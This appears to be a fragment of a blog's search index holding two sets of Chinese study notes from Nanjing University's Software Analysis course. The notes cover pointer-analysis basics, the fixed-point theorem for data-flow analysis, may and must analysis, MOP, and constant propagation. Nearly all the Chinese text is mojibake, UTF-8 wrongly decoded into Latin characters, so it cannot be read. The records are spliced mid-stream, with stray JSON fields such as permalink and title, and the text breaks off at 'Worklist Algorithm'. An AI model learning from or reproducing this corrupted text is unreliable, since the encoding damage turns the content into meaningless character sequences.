è€ƒè™‘è¯­å¥é¡ºåºï¼ˆæ§åˆ¶æµï¼‰çš„å½±å“ æµæ•æ„Ÿä¼šåœ¨æ¯ä¸ªç¨‹åºç‚¹éƒ½ä¿å­˜ä¸€ä»½æŒ‡é’ˆæŒ‡å‘å…³ç³»æ˜ å°„ æµä¸æ•æ„Ÿ æŠŠç¨‹åºå½“åšæ— åºè¯­å¥çš„é›†åˆã€‚ å¯¹æ•´ä¸ªç¨‹åºä¿å­˜ä¸€ä»½æŒ‡å‘å…³ç³»æ˜ å°„ ç›®å‰æµæ•æ„Ÿå¯¹ Java æå‡ä¸å¤§ï¼Œä¸è¿‡åœ¨ C ä¸­å¾ˆæœ‰æ•ˆï¼Œæœ¬è¯¾ç¨‹åˆ†æçš„æ˜¯ Javaï¼Œå¹¶ä¸”æµä¸æ•æ„ŸæŠ€æœ¯ç›¸å¯¹ç®€å•ï¼Œæ‰€ä»¥é‡ç‚¹è®¨è®ºæµä¸æ•æ„ŸæŠ€æœ¯ã€‚ åˆ†æèŒƒå›´ Whole-program å…¨ç¨‹åºï¼šåˆ†æå…¨ç¨‹åºçš„æŒ‡å‘å…³ç³»ã€‚ Demand-driven éœ€æ±‚é©±åŠ¨ï¼šåªåˆ†æå½±å“ç‰¹å®šåŸŸçš„æŒ‡é’ˆçš„æŒ‡å‘å…³ç³»ã€‚ å®é™…ä¸Šç°åœ¨å¤§å¤šæ˜¯éƒ½æ˜¯åšçš„å…¨ç¨‹åºçš„åˆ†æï¼Œå› ä¸ºéœ€æ±‚åˆ†æåˆ†æçš„ç‰¹å®šåŸŸä¸­çš„æŒ‡é’ˆå¯èƒ½ä¾èµ–äºå…¶ä»–åŸŸï¼Œæ‰€ä»¥éœ€æ±‚åˆ†æè®¡ç®—æŒ‡å‘å…³ç³»æœ€åçš„è®¡ç®—é‡å¯èƒ½ä¸æ¯”å…¨ç¨‹åºåˆ†æå¿«å¤šå°‘ã€‚å¹¶ä¸”å¦‚æœæ¯ä¸€å¤„éœ€æ±‚éƒ½è¦è¿›è¡Œä¸€æ¬¡è®¡ç®—ï¼Œè¿™äº›è®¡ç®—å¯èƒ½äº’ç›¸æœ‰é‡å çš„åœ°æ–¹ï¼Œæ‰€ä»¥å¯èƒ½éœ€æ±‚åˆ†æè¿˜ä¼šæ…¢ä¸€ç‚¹ã€‚ What Do We Analyze ä¸»è¦é›†ä¸­äºå¯ä»¥äº§ç”ŸæŒ‡å‘å…³ç³»çš„è¯­å¥ ä»¥ java ä¸ºä¾‹ï¼Œæœ‰ä¸€ä¸‹å‡ ç§æŒ‡é’ˆï¼š\nLocal variableï¼šx Static fieldï¼šC.f (æœ‰æ—¶å€™è¢«ç§°ä¸ºå…¨å±€å˜é‡) instance fieldï¼šx.fï¼ˆå¯¹è±¡çš„ field) Array elementï¼šarray[i] ï¼ˆé™æ€åˆ†æå¾€å¾€æ²¡åŠæ³•ç¡®å®šä¸‹æ ‡ï¼Œä¸€èˆ¬æ˜¯å°†æ•´ä¸ª array å­˜åˆ°ä¸€ä¸ª field ä¸­ï¼‰å¦‚ä¸‹å›¾ï¼Œå°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ•°ç»„å¯¹è±¡ï¼Œå­˜å‚¨å’Œè¯»å–éƒ½æ˜¯å¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œçš„ã€‚ Static field å’Œ local varible çš„åˆ†ææ–¹å¼ä¸€æ ·ï¼ŒArray element ç®€åŒ–åå’Œ instance field ç›¸åŒï¼Œæ‰€ä»¥èšç„¦äºç¬¬ä¸€ç§å’Œç¬¬ä¸‰ç§å¥å­çš„åˆ†æã€‚ ç›´æ¥å½±å“åˆ°æŒ‡é’ˆæŒ‡å‘çš„è¯­å¥ ä¸€èˆ¬åˆ†ä¸ºä»¥ä¸‹äº”ç§è¯­å¥ï¼š\nNew: x = new T() Assign: x = y Store: x.f = y Load: y = x.f Call: r = x.k(a,\u0026hellip;) Static call C.get() Special call super.foo() Virtual call x.get () ","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%85%AB%E8%8A%82%E7%AC%94%E8%AE%B0/","summary":"è§†é¢‘ï¼š å—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹ 08ï¼ˆPointer Analysis è¯¾ç¨‹ä¸»é¡µï¼šStatic Program Analysis | Tai-e (pascal-lab.net) ç¬”è®°å‚è€ƒï¼š(34æ¡æ¶ˆæ¯) ã€è¯¾ç¨‹ç¬”è®°ã€‘å—å¤§è½¯ä»¶åˆ†æè¯¾ç¨‹â€”1","title":"å—å¤§è½¯ä»¶åˆ†æç¬¬å…«èŠ‚ç¬”è®°"},{"content":"è§†é¢‘ï¼š å—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹ 06ï¼ˆData Flow Analysis - Foundations II è¯¾ç¨‹ä¸»é¡µï¼šStatic Program Analysis | Tai-e (pascal-lab.net) ç¬”è®°å‚è€ƒï¼š(34æ¡æ¶ˆæ¯) è½¯ä»¶åˆ†æâ€”â€”æ•°æ®æµåˆ†æ2_zccä»Šå¤©å¥½å¥½å­¦ä¹ äº†å—çš„åšå®¢-CSDNåšå®¢ (33æ¡æ¶ˆæ¯) ã€è¯¾ç¨‹ç¬”è®°ã€‘å—å¤§è½¯ä»¶åˆ†æè¯¾ç¨‹â€”16è¯¾æ—¶å®Œæ•´ç‰ˆ_bsauceçš„åšå®¢-CSDNåšå®¢_å—äº¬å¤§å­¦è½¯ä»¶åˆ†æç¬”è®° PPTï¼š https://cs.nju.edu.cn/tiantan/software-analysis/DFA-FD.pdf\nå°†ä¸åŠ¨ç‚¹å®šç†åº”ç”¨äºç®—æ³• ç¬¬ 5 èŠ‚è¯¾å‘æˆ‘ä»¬ä»‹ç»äº†ä¸åŠ¨ç‚¹å®šç†ï¼šå®Œå…¨ lattice ä¸”æ˜¯å•è°ƒçš„ã€æœ‰é™çš„ï¼Œé‚£ä¹ˆå­˜åœ¨ä¸åŠ¨ç‚¹ä¸”ä»âŠ¤å¼€å§‹è¿­ä»£æ‰¾å¾—åˆ°æœ€å¤§ä¸åŠ¨ç‚¹å’Œä»âŠ¥å¼€å§‹è¿­ä»£æ‰¾å¾—åˆ°æœ€å°ä¸åŠ¨ç‚¹ï¼›ç°åœ¨çš„é—®é¢˜æ˜¯ï¼šå¦‚ä½•å…³è”è¿­ä»£ç®—æ³•å’Œä¸åŠ¨ç‚¹ç†è®ºï¼ˆé‚£ä¹ˆå°±èƒ½è¯æ˜ç®—æ³•è§£å­˜åœ¨ã€ä¸”æœ€ä¼˜ï¼‰ ä¾æ®ä¸åŠ¨ç‚¹å®šç†çš„æ¡ä»¶ï¼Œæˆ‘ä»¬åªéœ€è¦è¯æ˜ CFG æ˜¯ä¸ª complete lattice + è¯æ˜è½¬ç§»å‡½æ•°æ˜¯å•è°ƒçš„ã€‚\nå› ä¸ºæ¯ä¸€ä¸ª $v_i$ éƒ½æ˜¯ complete\u0026amp;finite lattices é‚£ä¹ˆï¼Œä»–ä»¬çš„ç¬›å¡å°”ç§¯å¾—åˆ°çš„ product lattice ä¹Ÿæ˜¯ complete\u0026amp;finite çš„ï¼ˆlattice çš„æ€§è´¨ï¼‰ è½¬ç§»å‡½æ•°æœ‰ä¸¤æ­¥ï¼šç¬¬ä¸€æ­¥å¯¹æ¯ä¸ª node åº”ç”¨è½¬ç§»å‡½æ•°ï¼Œç¬¬äºŒæ­¥æ˜¯è¿›è¡Œ join æˆ– meet å¤„ç†ã€‚ ç¬¬ä¸€æ­¥çš„è½¬ç§»å‡½æ•°ä¸­å°±æ˜¯ gen å’Œ kill æ“ä½œï¼Œè€Œ gen å’Œ kill æ“ä½œæ˜¯å›ºå®šçš„ï¼Œç»“æœåªèƒ½æ˜¯ 0 å˜æˆ 1 æˆ–è€… 1 å˜æˆ 1ï¼Œæ˜¾ç„¶å•è°ƒã€‚ è¿™é‡Œæˆ‘ç¢ç£¨äº†å¥½ä¹…ï¼Œè¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„è½¬ç§»å‡½æ•°æ˜¯æ¯æ¬¡è¿­ä»£çš„è½¬ç§»å‡½æ•°ï¼Œè€Œä¸æ˜¯ BBs ä¹‹é—´çš„è½¬ç§»å‡½æ•°ã€‚BBs ä¹‹é—´è½¬ç§»å‡½æ•°çš„æ—¶å€™æ˜¯å¯èƒ½å°†ä¸Šä¸€ä¸ª BB ä½å‘é‡ä¸­çš„ 1 kill ä¸º 0ï¼Œæ­¤æ—¶æ¯”è¾ƒçš„æ˜¯ä¸Šä¸€ä¸ª BB å’Œå½“å‰ BB çš„ä½å‘é‡ï¼›ä½†æ˜¯åœ¨è¿­ä»£å±‚é¢æˆ‘ä»¬å»æ¯”è¾ƒçš„æ˜¯å½“å‰ BB åœ¨ä¸Šä¸€æ¬¡è¿­ä»£å’Œè¿™æ¬¡è¿­ä»£çš„ä½å‘é‡ï¼Œå› ä¸º gen å’Œ kill æ“ä½œæ˜¯å›ºå®šçš„ï¼Œç»“æœåªèƒ½æ˜¯ 0 å˜æˆ 1 æˆ–è€… 1 å˜æˆ 1ï¼Œæ‰€ä»¥æ˜¯å•è°ƒçš„ã€‚ ç¬¬äºŒæ­¥éœ€è¦åˆ†åˆ«è¯æ˜ join å’Œ meet æ˜¯å•è°ƒçš„ Meet è¯æ˜æ–¹æ³•åŒä¸Š è‡³æ­¤ï¼Œæˆ‘ä»¬å°†ä¸åŠ¨ç‚¹å®šç†ä¸æˆ‘ä»¬çš„ç®—æ³•è”ç³»èµ·æ¥äº†ï¼Œè¿­ä»£ç®—æ³•æ˜¯å¯ä»¥ç»ˆæ­¢çš„ï¼ˆåˆ°è¾¾ä¸åŠ¨ç‚¹ï¼‰ï¼Œå¹¶ä¸”ä¸åŠ¨ç‚¹æ˜¯æœ€å°æˆ–è€…æœ€å¤§ä¸åŠ¨ç‚¹ ä¸‹é¢æ¥è§£ç­”ç¬¬ä¸‰ä¸ªé—®é¢˜ï¼Œç®—æ³•ä»€ä¹ˆæ—¶å€™è¾¾åˆ°ä¸åŠ¨ç‚¹ï¼ˆå¤æ‚åº¦é—®é¢˜ï¼‰\nè¿­ä»£ç®—æ³•çš„å¤æ‚åº¦ Lattice çš„é«˜åº¦ï¼ˆæ·±åº¦ï¼‰ Top åˆ° Bottom æœ€é•¿çš„è·¯å¾„ é‚£ä¹ˆå¯ä»¥è¯´ lattice çš„æ·±åº¦æœ€é•¿çš„æƒ…å†µå°±æ˜¯ BB ä¸­ node çš„ä¸ªæ•°ï¼ˆå˜é‡çš„ä¸ªæ•°ï¼‰\næœ€åçš„è¿­ä»£æ¬¡æ•° æœ€åçš„æƒ…å†µå°±æ˜¯æ¯æ¬¡è¿­ä»£åªä¼šæ”¹å˜ä½å‘é‡ä¸­çš„ä¸€ä½ï¼Œå¹¶ä¸”ä¸åŠ¨ç‚¹åœ¨ä½å‘é‡å…¨ä¸º 1 å¤„ï¼Œæ‰€ä»¥æœ€åçš„è¿­ä»£æ¬¡æ•°å°±æ˜¯ h * k æ¬¡ï¼ˆè¿™é‡Œå­˜ç–‘ï¼‰ã€‚\nå…³äºæœ€åè¿­ä»£æ¬¡æ•°é‚£é‡Œï¼Œh * k ç†è§£ä¸äº†å•Šï¼Œæˆ‘è§‰å¾—æœ€åå°±æ˜¯ h å§ã€‚å°±æ‹¿è€å¸ˆçš„é‚£ä¸ªä¾‹å­æ¥è¯´æœ€ååº”è¯¥æ˜¯ 3x3=9ï¼Œä½†æ˜¯è¿­ä»£ä¸åº”è¯¥æ˜¯ç©ºåˆ°ç¬¬ä¸€å±‚ç„¶åç¬¬äºŒå±‚ç„¶åç¬¬ä¸‰å±‚ä¸€å…± 3 æ¬¡å—ï¼Œå¦‚æœéè¦ 9 æ¬¡çš„è¯ï¼Œç©ºåˆ°ç¬¬ä¸€å±‚è¿˜åˆè¦å›åˆ°ç©ºï¼Œç„¶åç©ºåˆ°ç¬¬ä¸€å±‚å¦å¤–çš„ä¸¤ä¸ªï¼Œè¿™æ˜¯ 3 æ¬¡ï¼Œç„¶åç¬¬ä¸€å±‚åˆ°ç¬¬äºŒå±‚å’Œç¬¬äºŒå±‚åˆ°ç¬¬ä¸‰å±‚åŒç†ä¸€å…± 9 æ¬¡ã€‚æ„Ÿè§‰è¿™ä¸ª 9 æ¬¡ä¸å¯¹å§ã€‚ ä» lattice çš„è§’åº¦æ¥çœ‹ may å’Œ must åˆ†æ (å…³äº may å’Œ must åˆ†æå¯ä»¥çœ‹ä¸€ä¸‹æ•°æ®æµåˆ†æ 1ï¼‰\nmay analysisï¼šè¾“å‡ºçš„ä¿¡æ¯å¯èƒ½æ˜¯æ­£ç¡®çš„ï¼ˆä¹Ÿæœ‰å¯èƒ½æ˜¯é”™è¯¯çš„ï¼‰ï¼Œæ‰€ä»¥æ˜¯è¿‡è¿‘ä¼¼çš„åˆ†æ must analysisï¼šè¾“å‡ºçš„ä¿¡æ¯ä¸€å®šæ˜¯æ­£ç¡®çš„ï¼Œæ‰€ä»¥æ˜¯æ¬ è¿‘ä¼¼åˆ†æ é€‰æ‹© may æˆ–è€… must åˆ†æéƒ½æ˜¯ä¸ºäº†åˆ†æç»“æœçš„å®‰å…¨æ€§ï¼ˆæ³¨æ„æ˜¯å®‰å…¨æ€§è€Œä¸æ˜¯æ­£ç¡®æ€§ï¼‰ æˆ‘ä¸ªäººçš„ç†è§£å°±æ˜¯ï¼š\nmay åˆ†æå°±åƒæ˜¯æˆ–æ“ä½œï¼Œä½†å‡¡åªæœ‰ 1 æ¡è·¯å¾„æ˜¯æ»¡è¶³æˆ‘åˆ†æè¦æ±‚çš„ï¼Œmay åˆ†æå°±ä¸ºçœŸã€‚ æ¯”å¦‚å¯è¾¾æ€§åˆ†æçš„åº”ç”¨â€”â€”æŸ¥çœ‹å“ªä¸ªå˜é‡æ²¡æœ‰åˆå§‹åŒ–ï¼Œåªè¦æœ‰ä¸€æ¡è·¯å¾„æ²¡æœ‰åˆå§‹åŒ–ï¼Œé‚£ä¹ˆæˆ‘çš„è¾“å‡ºå°±æ˜¯çœŸï¼Œæ­¤æ—¶è¾“å‡ºçš„ä¿¡æ¯ä¸å®Œå…¨æ­£ç¡®ï¼Œå› ä¸ºå…¶ä»–è·¯å¾„å¯¹å˜é‡åˆå§‹åŒ–äº†ï¼Œä½†æ˜¯è¿™æ ·çš„åˆ†æç»“æœæ˜¯å®‰å…¨çš„ï¼Œå› ä¸ºä¸èƒ½å­˜åœ¨æ²¡æœ‰åˆå§‹åŒ–çš„å˜é‡ Must åˆ†æå°±åƒæ˜¯ä¸æ“ä½œï¼Œå¿…é¡»æ‰€æœ‰è·¯å¾„éƒ½æ»¡è¶³æˆ‘åˆ†æçš„è¦æ±‚ï¼Œæ‰æ˜¯çœŸ æ¯”å¦‚ available è¡¨è¾¾å¼çš„åˆ†æçš„åº”ç”¨â€”â€”å°†è¡¨è¾¾å¼æœ€åçš„æ‰§è¡Œç»“æœä¿å­˜æ–¹ä¾¿åç»­çš„ä½¿ç”¨ï¼ˆä¸ç”¨æ¯æ¬¡éƒ½è®¡ç®—è¡¨è¾¾å¼ï¼‰ï¼Œè¿™å°±è¦æ±‚æ¯ä¸€æ¡è·¯å¾„éƒ½æ˜¯ availableï¼Œæ‰€ä»¥éœ€è¦æ¯ä¸€æ¡è·¯éƒ½ä¸ºçœŸï¼Œé‚£ä¹ˆæœ€åçš„ç»“æœæ‰æ˜¯çœŸã€‚ æ³¨æ„ may å’Œ must åˆ†æéœ€è¦é’ˆå¯¹å…·ä½“æ¡ˆä¾‹å…·ä½“åˆ†æï¼Œæœ‰çš„æ—¶å€™æ­£ç¡®æ€§å’Œå®‰å…¨æ€§å…¶å®æ˜¯çŸ›ç›¾çš„ã€‚ é¦–å…ˆï¼Œæ— è®ºæ˜¯ may è¿˜æ˜¯ must åˆ†æï¼Œéƒ½æ˜¯ä»ä¸å®‰å…¨çš„çŠ¶æ€é€æ¸è¿­ä»£åˆ°å®‰å…¨çš„çŠ¶æ€ï¼ˆä¸åŠ¨ç‚¹ï¼‰ï¼Œè€Œä¸”ç›¸åçš„æ˜¯ä»å‡†ç¡®çš„çŠ¶æ€åˆ°ä¸å‡†ç¡®çš„çŠ¶æ€ã€‚\nMay åˆ†æï¼ˆä»¥å¯è¾¾æ€§åˆ†æä¸¾ä¾‹ï¼‰ å°±åƒè¿™ä¸ªå›¾æ˜¾ç¤ºçš„ä¸€æ ·ï¼Œbottom è¡¨ç¤ºæ²¡æœ‰å®šä¹‰å¯è¾¾ï¼ˆæ„æ€å°±æ˜¯å˜é‡åœ¨æ‰€æœ‰çš„è·¯å¾„éƒ½åˆå§‹åŒ–äº†ï¼‰ï¼Œæ˜¾ç„¶è¿™æ ·çš„ç»“æœæ˜¯ä¸å®‰å…¨çš„ï¼Œä½†æ˜¯ç²¾åº¦ï¼ˆæ­£ç¡®æ€§ï¼‰æ˜¯æœ€é«˜çš„ï¼Œå› ä¸ºè¾“å‡ºçš„ç»“æœæ˜¯â€œæ¯æ¡è·¯å¾„éƒ½æ²¡æœ‰å®šä¹‰å¯è¾¾â€ã€‚ è€Œ top è¡¨ç¤ºæ‰€æœ‰çš„å®šä¹‰éƒ½æœ‰å¯èƒ½å¯è¾¾ï¼Œè¿™æ ·çš„ç»“æœæ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯ç²¾åº¦æœ€ä½ï¼Œå› ä¸ºè¿™å¥è¯å°±æ˜¯ä¸ªåºŸè¯ã€‚æ¯”å¦‚ä½ åœ¨åˆ†æå˜é‡æ˜¯å¦éƒ½è¢«åˆå§‹åŒ–ï¼Œè¾“å‡ºçš„ç»“æœæ˜¯å˜é‡å¯èƒ½è¢«åˆå§‹åŒ–ä¹Ÿå¯èƒ½æ²¡æœ‰è¢«åˆå§‹åŒ–ã€‚ï¼ˆæ³¨æ„è¿™é‡Œçš„å®‰å…¨å’Œç²¾åº¦æ˜¯é’ˆå¯¹ä½ çš„åˆ†æç»“è®ºï¼Œè€Œä¸æ˜¯åˆ†æçš„é‚£ä¸ªç¨‹åºã€‚ï¼‰ Bottom å’Œ top éƒ½ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œæ‰€ä»¥å¼•å…¥ä¸€ä¸ªæ¦‚å¿µ truth æ¥åˆ’åˆ† safe å’Œ unsafe - è¿™é‡Œè¯´ä¸€ä¸‹æˆ‘å¯¹ truth çš„ç†è§£ï¼Œè€å¸ˆè¯´ truth è¡¨ç¤ºçš„æ˜¯ç¨‹åºå¯¹æ‰€æœ‰è¾“å…¥çš„åŠ¨æ€è¾“å‡ºçš„é›†åˆï¼Œé‚£ä¹ˆå¯ä»¥ç†è§£ä¸ºè¿™ä¸ªæ¤­åœ†é‡Œé¢çš„ lattices å¹¶ä¸æ˜¯å…¨æ˜¯çœŸå®çš„ latticesï¼Œåªæ˜¯ä¸€ä¸ª lattices çš„å–å€¼ç©ºé—´ï¼Œå®é™…ä¸Šå¯¹åº”åˆ°åˆ†æçš„ç¨‹åºè€Œè¨€ï¼Œè¾“å‡ºå¾—åˆ°çš„ lattices çš„é›†åˆåœ¨è¿™ä¸ªæ¤­åœ†ï¼ˆå–å€¼ç©ºé—´ï¼‰ä¸­çš„ç‚¹ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º truthï¼Œä»¥æ­¤ä¸ºè¾¹ç•Œï¼Œåˆ’åˆ†äº† safe å’Œ unsafeã€‚ - åŒæ—¶è€å¸ˆä¹Ÿæåˆ°äº†ä¸ºä»€ä¹ˆæˆ‘ä»¬åˆ†æä¸€å®šæ˜¯ safe çš„å‘¢ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬åœ¨ cfg ä¸­ä¾æ® BBs ä¸­çš„æŒ‡ä»¤è®¾è®¡çš„è½¬ç§»å‡½æ•°å°±æ˜¯ safe çš„ã€‚ Okï¼Œç°åœ¨æˆ‘ä»¬çŸ¥é“äº†è¿™ä¸ªæ¤­åœ†ä»ä¸‹åˆ°ä¸Šä»ä¸å®‰å…¨è€Œå‡†ç¡®é€æ¸å˜åŒ–ä¸ºå®‰å…¨è€Œå‡†ç¡®ï¼Œå¹¶ä¸”æˆ‘ä»¬çš„åˆ†æå¾—åˆ°çš„ä¸åŠ¨ç‚¹ä¹Ÿåœ¨å®‰å…¨åŒºï¼Œé‚£ä¹ˆå¯¹äºä¼—å¤šçš„ä¸åŠ¨ç‚¹ï¼Œæˆ‘ä»¬é€‰æ‹©é‚£ä¸ªæœ€å‡†ç¡®çš„ï¼Œä¹Ÿå°±æ˜¯æœ€é è¿‘ bottom çš„â€”â€”æœ€å°ä¸åŠ¨ç‚¹ã€‚è€Œæˆ‘ä»¬çš„è¿­ä»£ç®—æ³•å¾—åˆ°çš„æ°å¥½å°±æ˜¯è¿™ä¸ªæœ€å°ä¸åŠ¨ç‚¹ã€‚\nMust åˆ†æï¼ˆä»¥available expressionsåˆ†æä¸ºä¾‹ï¼‰ åˆ†æåŒä¸Šï¼Œä¸å†èµ˜è¿° ## ä»â€œæœ€å°æ­¥ä¼â€çš„è§’åº¦æ¥ç®€è¦è¯æ˜æœ€å°/æœ€å¤§ä¸åŠ¨ç‚¹ å°†è¿­ä»£ç®—æ³•è½¬æ¢åˆ° lattice ä¸Šï¼Œè€ƒè™‘åˆ°äº† f : L â†’ L ï¼Œè¿™ä¸ªå‡½æ•°æœ¬è´¨ä¸Šå°±æ˜¯ç®—æ³•ä¸­çš„è½¬æ¢å‡½æ•°å’Œ join/mmet æ“ä½œæ„æˆçš„ã€‚ - è½¬æ¢å‡½æ•°å®é™…ä¸Šæ˜¯å›ºå®šçš„ï¼Œåªè¦ BB ç¡®å®šï¼Œé‚£ä¹ˆå…¶ kill å’Œ gen æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥åœ¨ lattice ä¸Šèµ°çš„æ­¥æ•°æ˜¯ç¡®å®šçš„ - join/mmetï¼šlattice ä¸Šå°±æ˜¯æ±‚ä¸¤ä¸ªå€¼çš„æœ€å°ä¸Šç•Œ/æœ€å¤§ä¸‹ç•Œï¼Œé‚£ä¹ˆå…¶èµ°çš„æ­¥æ•°ä¹Ÿæ˜¯æœ€å°çš„ =\u0026gt; æ‰€ä»¥ï¼Œå‡½æ•°åœ¨ lattice ä¸Šæ˜¯èµ°çš„æœ€å°æ­¥æ•°ï¼Œé‚£ä¹ˆå¾—åˆ°çš„ä¸åŠ¨ç‚¹ä¸€å®šæ˜¯ç¦»å‡ºå‘ç‚¹æœ€è¿‘çš„ï¼ˆä» bottom å‡ºå‘å°±æ˜¯æœ€å°ä¸åŠ¨ç‚¹ï¼Œä» top å‡ºå‘å°±æ˜¯æœ€å¤§ä¸åŠ¨ç‚¹ï¼‰\nMOP Meet-over-all-paths solution ï¼ˆæ˜¯è¡¡é‡ç²¾åº¦çš„ï¼‰ MOP å°±æ˜¯å°† entry åˆ°æŸä¸ª BB çš„æ‰€æœ‰è·¯å¾„çš„è½¬ç§»å‡½æ•°åˆä¸ºä¸€ä¸ªæ•´ä½“å‡½æ•° $F_P$ï¼Œ$MOP[S_i]=\\cup /\\cap F_p(OUT[Entry])$ MOP æ˜¯æœ‰å¦‚ä¸‹å‡ ä¸ªç‰¹ç‚¹ Not executable å°±æ˜¯æœ‰çš„è·¯å¾„å®é™…ä¸Šæ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ï¼Œå› ä¸ºåœ¨åˆ†æçš„æ—¶å€™ä¼šæœ‰ä¸€äº›å†—ä½™çš„è·¯å¾„ï¼Œæ‰€ä»¥å°±å¯¼è‡´äº† MOP å®é™…ä¸Šä¸æ˜¯å¾ˆå‡†ç¡® åŒæ—¶å› ä¸ºè¦éå†æ‰€æœ‰çš„è·¯å¾„ï¼Œæ‰€ä»¥å®ƒæ˜¯æ²¡æœ‰è¾¹ç•Œçš„ï¼ˆunboundedï¼‰ï¼Œè€Œä¸”å¦‚æœç¨‹åºå¾ˆå¤§è¿˜ä¼šæœ‰è·¯å¾„çˆ†ç‚¸çš„é—®é¢˜ï¼Œæ‰€ä»¥å®ƒåˆæ˜¯ä¸å¯æšä¸¾çš„ï¼ˆnot enumerableï¼‰ï¼Œæ‰€ä»¥å®ƒéš¾ä»¥æ“ä½œ ç»¼ä¸Šï¼ŒMOP è¿™ä¸ªæ–¹æ³•å¯èƒ½ä¸å‡†ç¡®ï¼Œå®é™…æ“ä½œæ€§ä¸é«˜ï¼Œæ˜¯ç†è®ºä¸Šçš„ä¸€ä¸ªè¡¡é‡æ–¹å¼ã€‚\nå°† MOP å’Œæˆ‘ä»¬è¿­ä»£ç®—æ³•è¿›è¡Œæ¯”è¾ƒæ¥æ›´å¥½çš„ç†è§£ MOP å¯¹äºä»¥ä¸Šçš„è¿™ä¸ªä¾‹å­ è¿­ä»£ç®—æ³•ï¼š $IN[S_4â€‹]=fS_3â€‹â€‹(fS_1â€‹â€‹(OUT[entry])\\cup fS_2â€‹â€‹(OUT[entry]))$ MOP: $IN[S_4â€‹]=fS_3â€‹â€‹(fS_1â€‹â€‹(OUT[entry]))\\cup fS_3â€‹â€‹(fS_2â€‹(OUT[entry]))$ æ‰€ä»¥è¿­ä»£ç®—æ³•å’Œ MOP çš„è®¡ç®—åŒºåˆ«åœ¨äºï¼š è¿­ä»£ç®—æ³•æ˜¯ï¼š$F(x\\cup y)$ MOP æ˜¯ï¼š$F(x)\\cup F(y)$ æˆ‘ä»¬å¯ä»¥æ¥è¯æ˜ä¸€ä¸‹è¿™ä¸¤ç§æ–¹å¼å“ªç§æ›´ç²¾å‡†ï¼š ![image.png](https://gitee.com/juhuahua/chart-bed/raw/master/20230202184735.png) è¿­ä»£ç®—æ³•çš„ç»“æœæ˜¯ MOP ç»“æœçš„ä¸Šç•Œï¼Œè¯´æ˜ MOP æ›´ç²¾å‡†äº›ï¼Œä½†æ˜¯å¦‚æœå‡½æ•° F æ»¡è¶³åˆ†é…å¾‹ï¼ˆdistributiveï¼‰é‚£ä¹ˆä¸¤è€…å°±ä¼šç›¸ç­‰ï¼Œç²¾å‡†åº¦æ˜¯ä¸€æ ·çš„ã€‚è€Œæˆ‘ä»¬è¿­ä»£ç®—æ³•ä¸­çš„ bit-vectorï¼ˆä½å‘é‡ï¼‰æˆ–è€…æ˜¯ gen/kill é—®é¢˜ï¼ˆå¯¹äº join/meet æ˜¯è¿›è¡Œé›†åˆçš„äº¤æˆ–å¹¶æ“ä½œï¼‰æ˜¯æ»¡è¶³åˆ†é…å¾‹çš„ã€‚ æ¥ä¸‹æ¥è¦è®²ä¸€ä¸ªä¸æ˜¯ distributive çš„ç®—æ³• # Constant propagation å¸¸é‡ä¼ æ’­ å®šä¹‰ï¼šç»™å®šä¸€ä¸ªå˜é‡ x åœ¨ç¨‹åºç‚¹ pï¼Œåˆ¤æ–­æ˜¯å¦åœ¨ p æ—¶ï¼Œx èƒ½ç¡®ä¿æœ‰ä¸ªå¸¸é‡ æ˜¾ç„¶è¿™æ˜¯ä¸ª must åˆ†æ å¯¹äºäº§é‡ä¼ æ’­çš„åˆ†æä¸­ï¼ŒCFG ä¸­æ¯ä¸ª node çš„ OUT éƒ½æ˜¯ä¸€ä¸ª pairsï¼ˆx, vï¼‰ï¼Œx è¡¨ç¤ºå˜é‡ï¼Œv è¡¨ç¤º node ä¹‹å x çš„å€¼ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹å¯¹äºè¿™ä¸ªåˆ†æï¼Œå®ƒçš„æ•°æ®æµæ¡†æ¶ï¼ˆDï¼ŒLï¼ŒFï¼‰ï¼ˆæ–¹å‘ï¼Œlatticesï¼Œè½¬ç§»å‡½æ•°ï¼‰æ˜¯ä»€ä¹ˆã€‚ ## æ–¹å‘ forwards ## Lattice å¦‚æœæ˜¯ must åˆ†æï¼Œé‚£ä¹ˆå°±æ˜¯ä»ä¸Šåˆ°ä¸‹è¿­ä»£ï¼ŒUNDEFï¼ˆundefinedï¼‰ åˆ° NACï¼ˆnot a constantï¼‰æ˜¯ä»ä¸å®‰å…¨ä¸”é«˜ç²¾åº¦åˆ°å®‰å…¨ä½ç²¾åº¦ã€‚UBDEF è¡¨ç¤ºå˜é‡éƒ½è¿˜æ²¡æœ‰å®šä¹‰ï¼ŒNAC è¡¨ç¤ºæ²¡æœ‰ä¸€ä¸ªæ˜¯å¸¸é‡ã€‚ä¸­é—´çš„æ•°å­—è¡¨ç¤ºå˜é‡å€¼å¯ä»¥æ˜¯ä»»ä½•ä¸€ä¸ªå®æ•°ã€‚ åœ¨è¿™ä¸ª lattice ä¸Šçš„ meet æ“ä½œä¹Ÿæœ‰äº›è®¸çš„ä¸åŒï¼š ## è½¬ç§»å‡½æ•° $F:OUT[s]=gen \\cup (IN[s]-\\{(x, \\_ )\\})$ Gen çš„è§„åˆ™å¦‚ä¸‹ï¼š ï¼ˆval (x) è¡¨ç¤ºå–å˜é‡ x çš„å€¼) ç°åœ¨æˆ‘ä»¬ Dï¼ŒLï¼ŒF éƒ½æ˜ç¡®äº†ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€çœ‹ä¸ºå•¥è¯´å¸¸é‡ä¼ æ’­æ˜¯ä¸æ»¡è¶³åˆ†é…ç‡çš„ã€‚ ä¸æ»¡è¶³åˆ†é…ç‡ å¦‚ä¸‹ä¾‹æ‰€ç¤º Worklist Algorithm 